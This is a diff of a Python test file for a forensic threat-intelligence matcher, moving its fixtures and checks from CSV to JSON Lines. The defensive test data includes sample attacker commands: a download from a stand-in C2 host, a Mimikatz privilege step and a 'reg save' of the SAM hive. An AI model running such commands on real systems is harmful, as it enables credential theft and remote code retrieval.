@@ -12,6 +12,7 @@ REPO = Path(__file__).resolve().parents[2]
 # Appended, not prepended: src/analysis/platform would shadow the stdlib module.
 sys.path.append(str(REPO / "src" / "analysis"))
 
+from rowanholt.core.records import read_records, write_records  # noqa: E402
 from rowanholt.threat_intel import COLUMNS, Indicator, ThreatIntelIndex, enrich_artefact, load, load_all  # noqa: E402
 from rowanholt.threat_intel.index import classify  # noqa: E402
 from rowanholt.threat_intel.match import match_case  # noqa: E402
@@ -158,12 +159,16 @@ def test_case_match(tmp_path):
     cooked.mkdir(parents=True)
     (case / "HOST" / "analysis").mkdir()
     (case / "mitre_techniques.txt").write_text("T1003.001\nT1059.001\nT1071\n")
-    (cooked / "powershell_history.csv").write_text(
-        "User,Command\nbob,Invoke-WebRequest http://c2.rivendell-lab.test/a\nbob,.\\mimikatz.exe privilege::debug\n")
-    (cooked / "events.json").write_text(json.dumps([{"EventData": {"CommandLine": "ping 198.51.100.23"}}]))
-    (case / "HOST" / "analysis" / "iocs.csv").write_text(
-        "CreationTime,LastAccessTime,LastWriteTime,Filename,ioc,indicator_type,line_number,resolvable,watchlist_match\n"
-        ",,,x,c2.rivendell-lab.test,domain,1,,\n,,,x,example.org,domain,2,,\n")
+    # As Elrond writes them: JSON Lines with the envelope (whose host name must not match anything)
+    write_records(cooked / "powershell_history.jsonl", [
+        {"User": "bob", "Command": "Invoke-WebRequest http://c2.rivendell-lab.test/a"},
+        {"User": "bob", "Command": ".\\mimikatz.exe privilege::debug"}], host="Mimikatz", artefact="powershell_history")
+    write_records(cooked / "events.jsonl", [{"EventData": {"CommandLine": "ping 198.51.100.23"}}],
+                  host="HOST", artefact="events")
+    write_records(case / "HOST" / "analysis" / "iocs.jsonl", [
+        {"Filename": "x", "ioc": "c2.rivendell-lab.test", "indicator_type": "domain", "watchlist_match": ""},
+        {"Filename": "x", "ioc": "example.org", "indicator_type": "domain", "watchlist_match": ""}],
+        host="HOST", artefact="iocs")
     indicators = procedures(("Mimikatz", "APT29", "T1003.001", "software"),
                             ("Invoke-WebRequest", "APT29", "T1059.001", "software"))
     indicators += [Indicator(evidential_element="c2.rivendell-lab.test", threat_group="APT34", technique_id="T1071.001",
@@ -171,14 +176,15 @@ def test_case_match(tmp_path):
                    Indicator(evidential_element="198.51.100.23", threat_group="APT34", source_type="Iran APT workbook")]
     totals = match_case(str(case), indicators)
     assert totals["hosts"] == 1 and totals["elements"] == 4 and totals["iocs"] == 1
-    with open(case / "HOST" / "analysis" / "threat_intel_matches.csv") as fh:
-        matches = {(r["Element"], r["Artefact"].split("/")[-1]) for r in csv.DictReader(fh)}
-    assert ("198.51.100.23", "events.json") in matches and ("Mimikatz", "powershell_history.csv") in matches
-    with open(case / "HOST" / "analysis" / "iocs.csv") as fh:
-        iocs = {r["ioc"]: r["watchlist_match"] for r in csv.DictReader(fh)}
+    found = [r for _, r in read_records(case / "HOST" / "analysis" / "threat_intel_matches.jsonl")]
+    matches = {(r["Element"], r["Artefact"].split("/")[-1], r["Field"]) for r in found}
+    assert ("198.51.100.23", "events.jsonl", "EventData.CommandLine") in matches
+    assert ("Mimikatz", "powershell_history.jsonl", "Command") in matches
+    assert all(r["Field"] not in ("host", "artefact", "source_path") for r in found)
+    assert ["T1003.001"] in [r["techniques"] for r in found]
+    iocs = {r["ioc"]: r["watchlist_match"] for _, r in read_records(case / "HOST" / "analysis" / "iocs.jsonl")}
     assert iocs == {"c2.rivendell-lab.test": "threat intel: APT34", "example.org": ""}
-    with open(case / "threat_groups.csv") as fh:
-        groups = list(csv.DictReader(fh))
+    groups = [r for _, r in read_records(case / "threat_groups.jsonl")]
     assert [(g["Group"], g["Basis"]) for g in groups] == [("APT34", "atomic indicators"),
                                                            ("APT29", "several specific procedures")]
     assert groups[1]["Techniques In Case"] == "T1003.001, T1059.001"
@@ -201,8 +207,8 @@ def test_gandalf_script_blocks_left_out(tmp_path):
     ]))
     totals = match_case(str(case), procedures(("reg save", "APT29", "T1003.002", "cmd")))
     assert totals["collector"] == 2 and totals["elements"] == 1
-    with open(case / "HOST" / "analysis" / "threat_intel_matches.csv") as fh:
-        rows = list(csv.DictReader(fh))
+    # An old case's JSON array: records are still #index
+    rows = [r for _, r in read_records(case / "HOST" / "analysis" / "threat_intel_matches.jsonl")]
     assert [r["Record"] for r in rows] == ["#2"] and "reg save HKLM\\SAM C:\\Users\\Public" in rows[0]["Value"]
 
 
